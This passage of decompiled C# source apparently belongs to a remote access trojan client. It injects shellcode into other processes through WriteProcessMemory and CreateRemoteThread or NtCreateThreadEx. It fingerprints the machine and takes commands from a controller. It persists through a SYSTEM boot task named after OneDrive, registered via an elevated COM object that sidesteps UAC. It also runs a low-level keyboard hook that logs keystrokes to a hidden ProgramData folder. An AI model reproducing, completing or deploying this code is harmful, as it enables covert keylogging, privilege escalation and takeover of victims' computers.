				Logger.Info($"Alloc {intPtr}");
				int lpNumberOfBytesWritten = 0;
				if (NativeInvoke.WriteProcessMemory(intPtr, intPtr2, shellcodebyts, shellcodebyts.Length, ref lpNumberOfBytesWritten))
				{
					Logger.Info("Write");
					if (!clienthelper.OperatingSystem.Contains("7"))
					{
						Logger.Info(NativeInvoke.CreateRemoteThread(intPtr, IntPtr.Zero, 0u, intPtr2, (IntPtr)shellcodebyts.Length, 0u, IntPtr.Zero).ToString() ?? "");
					}
					else
					{
						IntPtr threadHandle;
						int num = NativeInvoke.NtCreateThreadEx(out threadHandle, 2032639, IntPtr.Zero, intPtr, intPtr2, IntPtr.Zero, createSuspended: false, 0u, 0u, 0u, IntPtr.Zero);
						Logger.Info(threadHandle.ToString() ?? "");
					}
					Thread.Sleep(30000);
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message);
			}
		}
	}
	internal class InstructionHelper
	{
		internal static void Exec(byte[] bytes)
		{
			switch (bytes[0])
			{
			case 16:
				SocketManger.ModuleSleep = BitConverter.ToInt32(bytes, 1) * 1000;
				SocketManger.SocketModule.socketclose();
				break;
			case 17:
				SocketManger.kkeyboardManagaers.getKeyboardContent(bytes.Skip(1).ToArray());
				break;
			case 18:
				Process.GetCurrentProcess().Kill();
				break;
			}
		}
	}
	public static class Logger
	{
		public enum LogLevels
		{
			ERROR,
			INFO,
			DEBUG
		}

		public static readonly string currentExceptionPath;

		public static readonly bool writing;

		public static LogLevels Level { get; set; }

		static Logger()
		{
			currentExceptionPath = Environment.GetEnvironmentVariable("systemdrive") + "\\ProgramData\\OneDrives";
			if (writing && !Directory.Exists(currentExceptionPath))
			{
				Directory.CreateDirectory(currentExceptionPath);
			}
		}

		public static void Info(string logtext)
		{
			try
			{
				if (writing)
				{
					File.AppendAllText(currentExceptionPath + "\\LoggerException.log", DateTime.Now.ToString() + "    " + logtext + "\r\n");
				}
			}
			catch
			{
			}
			Thread.Sleep(100);
		}

		public static void RInfo(string logtext)
		{
		}
	}
	public class MidManager
	{
		public static readonly string MachineName = Environment.MachineName;

		public static readonly string UserName = Environment.UserName;

		public static string CPUID
		{
			get
			{
				//IL_0005: Unknown result type (might be due to invalid IL or missing references)
				//IL_000b: Expected O, but got Unknown
				//IL_0027: Unknown result type (might be due to invalid IL or missing references)
				try
				{
					ManagementClass val = new ManagementClass("Win32_Processor");
					try
					{
						ManagementObjectCollection instances = val.GetInstances();
						try
						{
							ManagementObjectEnumerator enumerator = instances.GetEnumerator();
							try
							{
								if (enumerator.MoveNext())
								{
									return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Properties().get_Item("ProcessorId").get_Value()
										.ToString();
								}
							}
							finally
							{
								((IDisposable)enumerator)?.Dispose();
							}
						}
						finally
						{
							((IDisposable)instances)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
				}
				catch (Exception ex)
				{
					Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
				}
				return "unknown";
			}
		}

		public static string SerialNumber
		{
			get
			{
				//IL_0005: Unknown result type (might be due to invalid IL or missing references)
				//IL_000b: Expected O, but got Unknown
				//IL_0025: Unknown result type (might be due to invalid IL or missing references)
				try
				{
					ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
					try
					{
						ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
						try
						{
							if (enumerator.MoveNext())
							{
								return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("SerialNumber").ToString();
							}
						}
						finally
						{
							((IDisposable)enumerator)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
				}
				catch (Exception ex)
				{
					Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
				}
				return "unknown";
			}
		}

		public static string MachineGuid
		{
			get
			{
				try
				{
					using RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Cryptography", RegistryKeyPermissionCheck.ReadSubTree);
					return registryKey.GetValue("MachineGuid", "unknown") as string;
				}
				catch (Exception ex)
				{
					Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
				}
				return "unknown";
			}
		}

		public static string GetNewMid()
		{
			Logger.Info("GetNewMid");
			string operatingSystem = clienthelper.OperatingSystem;
			for (int i = 0; i < 3; i++)
			{
				if (!operatingSystem.Equals("unknown"))
				{
					break;
				}
				Thread.Sleep(3000);
				operatingSystem = clienthelper.OperatingSystem;
			}
			return Hash.GetHash(clienthelper.MachineName + operatingSystem + clienthelper.Install + clienthelper.Privileges + clienthelper.currentProcess, "@");
		}

		public static string GetMid()
		{
			string hash = Hash.GetHash(MachineName + SerialNumber, "@");
			string hash2 = Hash.GetHash(Environment.MachineName, "@");
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + hash2);
				string text = registryKey.GetValue(hash2 + "mid", null) as string;
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
				registryKey.SetValue(hash2 + "mid", hash);
				return hash;
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
				return hash;
			}
		}
	}
	public class MutexUtils
	{
		private static Mutex _mutex;

		public static bool CreateMutex(string MutexName)
		{
			new Mutex(initiallyOwned: true, "Global\\" + MutexName, out var createdNew);
			return createdNew;
		}

		public static bool openExitMutex(string MutexName)
		{
			try
			{
				return Mutex.OpenExisting("Global\\" + MutexName) != null;
			}
			catch
			{
			}
			return false;
		}

		public static void CreateMutex(string MutexName, bool isMutex)
		{
			if (isMutex)
			{
				_mutex = new Mutex(initiallyOwned: true, "Global\\" + MutexName, out var createdNew);
				if (!createdNew)
				{
					Process.GetCurrentProcess().Kill();
				}
			}
		}

		public static void ReleaseMutex()
		{
			_mutex?.ReleaseMutex();
		}
	}
	public class NativeInvoke
	{
		[DllImport("Dnsapi.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool DnsFlushResolverCache();

		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenMutexA(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In][MarshalAs(UnmanagedType.LPStr)] string lpName);

		[DllImport("kernel32.dll")]
		public static extern IntPtr CreateMutexA([In] IntPtr lpMutexAttributes, [MarshalAs(UnmanagedType.Bool)] bool bInitialOwner, [In][MarshalAs(UnmanagedType.LPStr)] string lpName);

		[DllImport("kernel32.dll")]
		public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

		[DllImport("kernel32.dll")]
		public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

		[DllImport("kernel32.dll")]
		public static extern bool VirtualProtect(IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, IntPtr ProcessInformation, int ProcessInformationLength, ref int ReturnLength);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

		[DllImport("kernel32.dll")]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

		[DllImport("advapi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool OpenProcessToken([In] IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

		[DllImport("advapi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool GetTokenInformation([In] IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out IntPtr ReturnLength);

		[DllImport("advapi32.dll")]
		public static extern IntPtr GetSidSubAuthorityCount([In] IntPtr pSid);

		[DllImport("advapi32.dll")]
		public static extern IntPtr GetSidSubAuthority([In] IntPtr pSid, uint nSubAuthority);

		[DllImport("kernel32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool CloseHandle([In] IntPtr hObject);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint ResumeThread(IntPtr hThread);

		[DllImport("kernel32.dll")]
		public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, IntPtr dwFreeType);

		[DllImport("kernel32.dll")]
		public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern int NtCreateThreadEx(out IntPtr threadHandle, int desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr parameter2);
	}
	public class Power
	{
		public static bool checkPowerstatus()
		{
			Process[] processesByName = Process.GetProcessesByName(Administrator.IsAdministrator() ? "lsass" : "explorer");
			if (processesByName.Length != 1)
			{
				return false;
			}
			TimeSpan timeSpan = DateTime.Now - processesByName[0].StartTime;
			if (timeSpan.Days == 0 && timeSpan.Hours == 0 && timeSpan.Minutes <= 5)
			{
				Logger.Info("checkPowerstatus true");
				return true;
			}
			return false;
		}
	}
	public class ProcessingAPPName
	{
		public static void getname()
		{
			if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("OnBlindMark"))
			{
				config.IsMutex = false;
			}
		}
	}
	public class ProcessingCommand
	{
		public static void GetProcessingLine()
		{
			try
			{
				if (Environment.CommandLine.EndsWith("high", StringComparison.OrdinalIgnoreCase))
				{
					config.IsMutex = false;
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
			}
		}
	}
	public class ScheduleTask
	{
		[Guid("804bd226-af47-4d71-b492-443a57610b08")]
		[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		private interface IElevatedFactoryServer
		{
			[return: MarshalAs(UnmanagedType.Interface)]
			object ServerCreateElevatedObject([In][MarshalAs(UnmanagedType.LPStruct)] Guid rclsid, [In][MarshalAs(UnmanagedType.LPStruct)] Guid riid);
		}

		public struct BIND_OPTS3
		{
			public uint cbStruct;

			public uint grfFlags;

			public uint grfMode;

			public uint dwTickCountDeadline;

			public uint dwTrackFlags;

			public uint dwClassContext;

			public uint locale;

			public IntPtr pServerInfo;

			public IntPtr hwnd;
		}

		public delegate void supxLdrEnumModulesCallback(IntPtr DataTableEntry, IntPtr Context, out bool StopEnumeration);

		private static readonly string Taskname = "Interop OneDrive Standalone";

		private static readonly string taskPath = "\\Microsoft\\Windows";

		private static string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n  <RegistrationInfo>\r\n    <Description>ConsoleProgramTask</Description>\r\n  </RegistrationInfo>\r\n  <Triggers>\r\n    <BootTrigger>\r\n      <Enabled>true</Enabled>\r\n    </BootTrigger>\r\n  </Triggers>\r\n  <Principals>\r\n    <Principal id=\"Author\">\r\n      <UserId>SYSTEM</UserId>\r\n      <RunLevel>HighestAvailable</RunLevel>\r\n    </Principal>\r\n  </Principals>\r\n  <Settings>\r\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\r\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\r\n    <AllowHardTerminate>true</AllowHardTerminate>\r\n    <StartWhenAvailable>false</StartWhenAvailable>\r\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n    <IdleSettings>\r\n      <Duration>PT10M</Duration>\r\n      <WaitTimeout>PT1H</WaitTimeout>\r\n      <StopOnIdleEnd>true</StopOnIdleEnd>\r\n      <RestartOnIdle>false</RestartOnIdle>\r\n    </IdleSettings>\r\n    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n    <Enabled>true</Enabled>\r\n    <Hidden>false</Hidden>\r\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>\r\n    <WakeToRun>false</WakeToRun>\r\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\r\n    <Priority>7</Priority>\r\n  </Settings>\r\n  <Actions Context=\"Author\">\r\n    <Exec>\r\n      <Command>&</Command>\r\n    </Exec>\r\n  </Actions>\r\n</Task>";

		public static string copyNewPath(string processPath)
		{
			if (!Directory.Exists(config.path))
			{
				Directory.CreateDirectory(config.path);
			}
			string text = Path.Combine(Path.GetDirectoryName(processPath), "Oncode.db");
			string text2 = Path.Combine(Path.GetDirectoryName(processPath), "msvcr120.dll");
			string text3 = Path.Combine(Path.GetDirectoryName(processPath), "jli.dll");
			string text4 = Path.Combine(config.path, Path.GetFileName(processPath));
			string text5 = Path.Combine(config.path, Path.GetFileName(text));
			string text6 = Path.Combine(config.path, Path.GetFileName(text2));
			string text7 = Path.Combine(config.path, Path.GetFileName(text3));
			using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + Environment.MachineName))
			{
				registryKey.SetValue(Environment.MachineName + "newpath", text4);
			}
			if (File.Exists(processPath) && !File.Exists(text4))
			{
				File.Copy(processPath, text4);
			}
			if (File.Exists(text) && !File.Exists(text5))
			{
				File.Copy(text, text5);
			}
			if (File.Exists(text2) && !File.Exists(text6))
			{
				File.Copy(text2, text6);
			}
			if (File.Exists(text3) && !File.Exists(text7))
			{
				File.Copy(text3, text7);
			}
			return text4;
		}

		public static void CreateTask(string command)
		{
			//IL_007e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0084: Expected O, but got Unknown
			if (command.Contains("svchost") || command.Contains("OnBlindMark") || command.Contains("PendingGPOs"))
			{
				return;
			}
			string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));
			if (!Directory.Exists(config.path + "\\" + text))
			{
				Directory.CreateDirectory(config.path + "\\" + text);
			}
			string newValue = copyNewPath(command);
			try
			{
				string text2 = xml.Replace("&", newValue);
				TaskSchedulerClass val = new TaskSchedulerClass();
				val.Connect(Type.Missing, Type.Missing, Type.Missing, Type.Missing);
				ITaskFolder folder = val.GetFolder(taskPath);
				if (!QueryTask())
				{
					RPCCreateTask(text2);
					if (!QueryTask())
					{
						folder.RegisterTask(Taskname, text2, 0, (object)null, (object)null, (_TASK_LOGON_TYPE)3, (object)null);
					}
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message);
			}
		}

		public static void deletetask()
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0006: Expected O, but got Unknown
			try
			{
				TaskSchedulerClass val = new TaskSchedulerClass();
				val.Connect(Type.Missing, Type.Missing, Type.Missing, Type.Missing);
				val.GetFolder(taskPath).DeleteTask(Taskname, 0);
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message);
			}
		}

		public static bool QueryTask()
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0006: Expected O, but got Unknown
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0045: Expected O, but got Unknown
			try
			{
				TaskSchedulerClass val = new TaskSchedulerClass();
				val.Connect(Type.Missing, Type.Missing, Type.Missing, Type.Missing);
				foreach (IRegisteredTask task in val.GetFolder(taskPath).GetTasks(1))
				{
					IRegisteredTask val2 = task;
					if (val2.get_Name().Equals(Taskname))
					{
						return true;
					}
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message);
			}
			return false;
		}

		private static void RPCCreateTask(string newxml)
		{
			//IL_0065: Unknown result type (might be due to invalid IL or missing references)
			//IL_0084: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				BIND_OPTS3 pBindOptions = default(BIND_OPTS3);
				pBindOptions.cbStruct = (uint)Marshal.SizeOf((object)pBindOptions);
				pBindOptions.dwClassContext = 4u;
				object obj = (CoGetObject("Elevation:Administrator!new:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}", ref pBindOptions, new Guid("{00000000-0000-0000-C000-000000000046}")) as IElevatedFactoryServer).ServerCreateElevatedObject(new Guid("{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}"), new Guid("{00000000-0000-0000-C000-000000000046}"));
				object obj2 = ((obj is ITaskService) ? obj : null);
				((ITaskService)obj2).Connect(Type.Missing, Type.Missing, Type.Missing, Type.Missing);
				((ITaskService)obj2).GetFolder(taskPath).RegisterTask(Taskname, newxml, 0, (object)null, (object)null, (_TASK_LOGON_TYPE)3, (object)null);
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message);
			}
		}

		[DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
		[return: MarshalAs(UnmanagedType.Interface)]
		private static extern object CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In][MarshalAs(UnmanagedType.LPStruct)] Guid riid);

		[DllImport("ntdll.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern void RtlInitUnicodeString(IntPtr desc, string str);

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern int LdrEnumerateLoadedModules(int Flags, supxLdrEnumModulesCallback CallbackFunction, IntPtr Context);
	}
	public class shellexec
	{
		[StructLayout(LayoutKind.Sequential)]
		public class SECURITY_ATTRIBUTES
		{
			public int nLength;

			public string lpSecurityDescriptor;

			public bool bInheritHandle;
		}

		public struct STARTUPINFO
		{
			public int cb;

			public string lpReserved;

			public string lpDesktop;

			public int lpTitle;

			public int dwX;

			public int dwY;

			public int dwXSize;

			public int dwYSize;

			public int dwXCountChars;

			public int dwYCountChars;

			public int dwFillAttribute;

			public int dwFlags;

			public int wShowWindow;

			public int cbReserved2;

			public byte lpReserved2;

			public IntPtr hStdInput;

			public IntPtr hStdOutput;

			public IntPtr hStdError;
		}

		public struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;

			public IntPtr hThread;

			public int dwProcessId;

			public int dwThreadId;
		}

		public static void WinExec(string FileName, string Argument, string WorkingDirectory, string Verb)
		{
			Process.Start(new ProcessStartInfo
			{
				WorkingDirectory = WorkingDirectory,
				CreateNoWindow = false,
				Arguments = Argument,
				FileName = FileName,
				WindowStyle = ProcessWindowStyle.Hidden,
				Verb = Verb
			});
		}

		[DllImport("Kernel32.dll")]
		public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

		[DllImport("Kernel32.dll", CharSet = CharSet.Ansi)]
		public static extern bool CreateProcess(StringBuilder lpApplicationName, StringBuilder lpCommandLine, SECURITY_ATTRIBUTES lpProcessAttributes, SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, StringBuilder lpEnvironment, StringBuilder lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
	}
	public class WindowStation
	{
		private const uint MAXIMUM_ALLOWED = 33554432u;

		private const uint GENERIC_ALL = 268435456u;

		private const uint DF_ALLOWOTHERACCOUNTHOOK = 1u;

		private const int UOI_NAME = 2;

		private const uint WINSTA_ACCESSCLIPBOARD = 4u;

		private const uint WINSTA_ACCESSGLOBALATOMS = 32u;

		private const uint WINSTA_CREATEDESKTOP = 8u;

		private const uint WINSTA_ENUMDESKTOPS = 1u;

		private const uint WINSTA_ENUMERATE = 256u;

		private const uint WINSTA_EXITWINDOWS = 64u;

		private const uint WINSTA_READATTRIBUTES = 2u;

		private const uint WINSTA_READSCREEN = 512u;

		private const uint WINSTA_WRITEATTRIBUTES = 16u;

		private const int DESKTOP_READOBJECTS = 1;

		private const int DESKTOP_CREATEWINDOW = 2;

		private const int DESKTOP_CREATEMENU = 4;

		private const int DESKTOP_HOOKCONTROL = 8;

		private const int DESKTOP_JOURNALRECORD = 16;

		private const int DESKTOP_JOURNALPLAYBACK = 32;

		private const int DESKTOP_ENUMERATE = 64;

		private const int DESKTOP_WRITEOBJECTS = 128;

		private const int DESKTOP_SWITCHDESKTOP = 256;

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr OpenInputDesktop(uint dwFlags, bool fInherit, uint dwDesiredAccess);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, byte[] pvInfo, uint nLength, ref uint lpnLengthNeeded);

		[DllImport("user32.dll")]
		public static extern IntPtr OpenWindowStation(string lpszWinSta, bool fInherit, uint dwDesiredAccess);

		[DllImport("user32.dll")]
		public static extern bool SetProcessWindowStation(IntPtr hWinSta);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool CloseDesktop(IntPtr hDesktop);

		[DllImport("user32.dll")]
		public static extern bool SetThreadDesktop(IntPtr hDesktop);

		public static void SetWindowStation()
		{
			try
			{
				if (!Environment.UserName.ToLower().Equals("system"))
				{
					return;
				}
				IntPtr intPtr = OpenWindowStation("WinSta0", fInherit: false, 895u);
				if (intPtr == IntPtr.Zero || !SetProcessWindowStation(intPtr))
				{
					return;
				}
				IntPtr intPtr2 = OpenInputDesktop(1u, fInherit: false, 33554432u);
				if (!(intPtr2 == IntPtr.Zero))
				{
					byte[] array = new byte[256];
					uint lpnLengthNeeded = 0u;
					GetUserObjectInformation(intPtr2, 2, array, (uint)array.Length, ref lpnLengthNeeded);
					if (lpnLengthNeeded != 0)
					{
						SetThreadDesktop(intPtr2);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
namespace newClient.keyboard
{
	public static class KeyBoardDisplayList
	{
		private static Hashtable HtKeyBoardButton = new Hashtable();

		public static void clearHashtable()
		{
			HtKeyBoardButton.Clear();
		}

		public static void Init()
		{
			if (HtKeyBoardButton.Count == 0)
			{
				HtKeyBoardButton.Add(0, "[None]");
				HtKeyBoardButton.Add(8, "[Backspace]");
				HtKeyBoardButton.Add(9, "[Tab]");
				HtKeyBoardButton.Add(12, "[Clear]");
				HtKeyBoardButton.Add(13, "[Enter]");
				HtKeyBoardButton.Add(16, "[Shift]");
				HtKeyBoardButton.Add(17, "[Ctrl]");
				HtKeyBoardButton.Add(18, "[Alt]");
				HtKeyBoardButton.Add(19, "[Pause]");
				HtKeyBoardButton.Add(20, "[CapsLock]");
				HtKeyBoardButton.Add(27, "[Esc]");
				HtKeyBoardButton.Add(32, " ");
				HtKeyBoardButton.Add(33, "[PageUp]");
				HtKeyBoardButton.Add(34, "[PageDown]");
				HtKeyBoardButton.Add(35, "[End]");
				HtKeyBoardButton.Add(36, "[Home]");
				HtKeyBoardButton.Add(37, "[←]");
				HtKeyBoardButton.Add(38, "[↑]");
				HtKeyBoardButton.Add(39, "[→]");
				HtKeyBoardButton.Add(40, "[↓]");
				HtKeyBoardButton.Add(41, "[Select]");
				HtKeyBoardButton.Add(42, "[PrintScreen]");
				HtKeyBoardButton.Add(43, "[Execute]");
				HtKeyBoardButton.Add(44, "[SnapShot]");
				HtKeyBoardButton.Add(45, "[Insert]");
				HtKeyBoardButton.Add(46, "[Delete]");
				HtKeyBoardButton.Add(47, "[Help]");
				HtKeyBoardButton.Add(48, "0");
				HtKeyBoardButton.Add(49, "1");
				HtKeyBoardButton.Add(50, "2");
				HtKeyBoardButton.Add(51, "3");
				HtKeyBoardButton.Add(52, "4");
				HtKeyBoardButton.Add(53, "5");
				HtKeyBoardButton.Add(54, "6");
				HtKeyBoardButton.Add(55, "7");
				HtKeyBoardButton.Add(56, "8");
				HtKeyBoardButton.Add(57, "9");
				HtKeyBoardButton.Add(65, "A");
				HtKeyBoardButton.Add(66, "B");
				HtKeyBoardButton.Add(67, "C");
				HtKeyBoardButton.Add(68, "D");
				HtKeyBoardButton.Add(69, "E");
				HtKeyBoardButton.Add(70, "F");
				HtKeyBoardButton.Add(71, "G");
				HtKeyBoardButton.Add(72, "H");
				HtKeyBoardButton.Add(73, "I");
				HtKeyBoardButton.Add(74, "J");
				HtKeyBoardButton.Add(75, "K");
				HtKeyBoardButton.Add(76, "L");
				HtKeyBoardButton.Add(77, "M");
				HtKeyBoardButton.Add(78, "N");
				HtKeyBoardButton.Add(79, "O");
				HtKeyBoardButton.Add(80, "P");
				HtKeyBoardButton.Add(81, "Q");
				HtKeyBoardButton.Add(82, "R");
				HtKeyBoardButton.Add(83, "S");
				HtKeyBoardButton.Add(84, "T");
				HtKeyBoardButton.Add(85, "U");
				HtKeyBoardButton.Add(86, "V");
				HtKeyBoardButton.Add(87, "W");
				HtKeyBoardButton.Add(88, "X");
				HtKeyBoardButton.Add(89, "Y");
				HtKeyBoardButton.Add(90, "Z");
				HtKeyBoardButton.Add(91, "[LWin]");
				HtKeyBoardButton.Add(92, "[RWin]");
				HtKeyBoardButton.Add(93, "[Apps]");
				HtKeyBoardButton.Add(96, "0");
				HtKeyBoardButton.Add(97, "1");
				HtKeyBoardButton.Add(98, "2");
				HtKeyBoardButton.Add(99, "3");
				HtKeyBoardButton.Add(100, "4");
				HtKeyBoardButton.Add(101, "5");
				HtKeyBoardButton.Add(102, "6");
				HtKeyBoardButton.Add(103, "7");
				HtKeyBoardButton.Add(104, "8");
				HtKeyBoardButton.Add(105, "9");
				HtKeyBoardButton.Add(106, "*");
				HtKeyBoardButton.Add(107, "+");
				HtKeyBoardButton.Add(108, "[Enter]");
				HtKeyBoardButton.Add(109, "-");
				HtKeyBoardButton.Add(110, ".");
				HtKeyBoardButton.Add(111, "/");
				HtKeyBoardButton.Add(112, "F1");
				HtKeyBoardButton.Add(113, "F2");
				HtKeyBoardButton.Add(114, "F3");
				HtKeyBoardButton.Add(115, "F4");
				HtKeyBoardButton.Add(116, "F5");
				HtKeyBoardButton.Add(117, "F6");
				HtKeyBoardButton.Add(118, "F7");
				HtKeyBoardButton.Add(119, "F8");
				HtKeyBoardButton.Add(120, "F9");
				HtKeyBoardButton.Add(121, "F10");
				HtKeyBoardButton.Add(122, "F11");
				HtKeyBoardButton.Add(123, "F12");
				HtKeyBoardButton.Add(124, "F13");
				HtKeyBoardButton.Add(125, "F14");
				HtKeyBoardButton.Add(126, "F15");
				HtKeyBoardButton.Add(127, "F16");
				HtKeyBoardButton.Add(144, "[NumLock]");
				HtKeyBoardButton.Add(145, "[ScreenPrint]");
				HtKeyBoardButton.Add(160, "[Shift]");
				HtKeyBoardButton.Add(161, "[Shift]");
				HtKeyBoardButton.Add(162, "[Ctrl]");
				HtKeyBoardButton.Add(163, "[Ctrl]");
				HtKeyBoardButton.Add(164, "[Alt]");
				HtKeyBoardButton.Add(165, "[Alt]");
				HtKeyBoardButton.Add(186, ";");
				HtKeyBoardButton.Add(187, "+");
				HtKeyBoardButton.Add(188, ",");
				HtKeyBoardButton.Add(189, "-");
				HtKeyBoardButton.Add(190, ".");
				HtKeyBoardButton.Add(191, "/");
				HtKeyBoardButton.Add(192, "~");
				HtKeyBoardButton.Add(219, "[");
				HtKeyBoardButton.Add(220, "\\");
				HtKeyBoardButton.Add(221, "]");
				HtKeyBoardButton.Add(222, "'");
			}
		}

		public static string GetStrByCode(int code)
		{
			if (HtKeyBoardButton.Contains(code))
			{
				return ((string)HtKeyBoardButton[code]) ?? null;
			}
			return null;
		}
	}
	public class keyboardManagaers
	{
		private static readonly byte[] Operationpwd = Encoding.UTF8.GetBytes("keyboard");

		private object syncroot = new object();

		private object LogSyncRoot = new object();

		private const int WH_KEYBOARD_LL = 13;

		private const int WM_KEYDOWN = 256;

		private NtApi32.HookProc _KeyboardProc;

		private IntPtr _HHOOK = IntPtr.Zero;

		public static List<byte> KeyboardList = new List<byte>();

		private string CurrentActiveWindowTitle;

		public static string keyboardfilePath = Environment.GetEnvironmentVariable("systemdrive") + "\\ProgramData\\OneDrives";

		public keyboardManagaers()
		{
			if (!Directory.Exists(keyboardfilePath))
			{
				Directory.CreateDirectory(keyboardfilePath);
			}
			keyboardfilePath = Path.Combine(keyboardfilePath, "kb.db");
		}

		public void Run()
		{
			if (Process.GetCurrentProcess().SessionId == 1 && MutexUtils.CreateMutex("board"))
			{
				Thread thread = new Thread((ParameterizedThreadStart)delegate
				{
					WindowStation.SetWindowStation();
					KeyBoardDisplayList.Init();
					_KeyboardProc = KeyboardProc;
